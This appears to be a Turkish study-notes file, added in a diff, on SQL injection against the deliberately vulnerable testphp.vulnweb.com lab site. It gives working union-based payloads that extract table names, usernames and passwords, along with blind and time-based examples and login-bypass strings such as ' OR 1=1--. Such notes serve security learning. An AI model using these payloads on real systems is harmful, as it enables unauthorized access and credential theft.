@@ -1,0 +1,65 @@
+Terminal:
+	mysql -u root -p		# mysql Giriş
+	create database test		# database oluşturma
+	use test			# kullanacağımız database ismi
+
+CREATE TABLE users (
+    id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
+    firstname VARCHAR(30) NOT NULL,
+    lastname VARCHAR(30) NOT NULL
+);
+
+	INSERT INTO users (firstname,lastname) VALUEs ('turgay','kara');	# Kolonumuza yeni değer ekledik.
+	select * from users;		# kolonun içeriklerini gösterir.
+
+
+
+  SQL INJECTION
+
+SQL Açığının varlığını kontrol etmek:
+http://testphp.vulnweb.com/listproducts.php?cat=1	# 2 link de bizi aynı siteye görürüse,
+http://testphp.vulnweb.com/listproducts.php?cat=2-1	# o sitede SQL açığı var demektir.
+
+
+
+Union SQLi
+Links-step by step:
+http://testphp.vulnweb.com/listproducts.php?cat=1
+testphp.vulnweb.com/listproducts.php?cat=1 UNION SELECT 1	# Hata verdi çünkü kolon sayıları farklı. (referans noktamıza dönmemiz lazım.)
+testphp.vulnweb.com/listproducts.php?cat=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11		# Referans noktamıza(baştaki ile aynı sayfaya) döndük.
+testphp.vulnweb.com/listproducts.php?cat=1 UNION SELECT 1,2,3,4,5,6,version(),8,9,10,11			# 7 kısmında Kullanılan versiyonu görebiliriz.
+testphp.vulnweb.com/listproducts.php?cat=-9999 UNION SELECT 1,2,3,4,5,6,version(),8,9,10,11		# sadeleştirdik.
+testphp.vulnweb.com/listproducts.php?cat=-9999 UNION SELECT 1,2,3,4,5,6,database(),8,9,10,11		# database'leri çektik.
+testphp.vulnweb.com/listproducts.php?cat=-9999 UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11 FROM information_schema.tables WHERE table_schema = database();	# tablo şemasının mevcut database'e eşit olanı getir.
+testphp.vulnweb.com/listproducts.php?cat=-9999 UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11 FROM information_schema.columns WHERE table_name = 'users';	#users'in kolonlarını çektik.
+testphp.vulnweb.com/listproducts.php?cat=-9999 UNION SELECT 1,2,3,4,5,6,uname,8,9,10,11 FROM users	# uname'i çektik. (test)
+testphp.vulnweb.com/listproducts.php?cat=-9999 UNION SELECT 1,2,3,4,5,6,pass,8,9,10,11 FROM users	# pword'ü çektik. (test)
+
+Veritabanı başka bir tema olsaydı,
+information.schema yerine ne yapardık?
+ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
+
+
+
+Blind SQLi
+Sistemin davranışına göre doğrudan bir hata mesajı veya çıktı vermeyen, ancak belirli koşullara göre farklı tepkiler gösteren saldırı türüdür.
+
+SELECT * FROM haberler WHERE id = 1 AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1), 1, 1))>80
+> Cekmeye calistigin table_name'in 1. harfinin ascii karsiligi > 80 ise 1 dondurur ve denklem 1=1 olur. Devaminda 1=0 olana dek sayiyi arttir veya azalt.
+
+SELECT * FROM haberler WHERE id = 1 AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1,1), 1, 1)) > 80
+> Aynisini column_name icin de yapacagiz.
+
+
+
+Time Based SQLi
+# Sistem 1=1 de olsa 1=0 da olsa ayni sorguyu donduruyorsa ne yapacagiz? (time based)
+
+SELECT * FROM users WHERE id = IF(1=1,sleep(5),0);	-> 1=1 ise 5 saniye bekle.
+
+
+SQLi turu ne olursa olsun injection'in varligini en kisa yoldan tespit etmek:
+http://example.com/product?id=1'
+http://example.com/login?username=admin&password=' OR 1=1--
+https://github.com/swisskyrepo/PayloadsAllTheThings <payloads>
+http://example.com/product?id=1' AND SLEEP(5)--
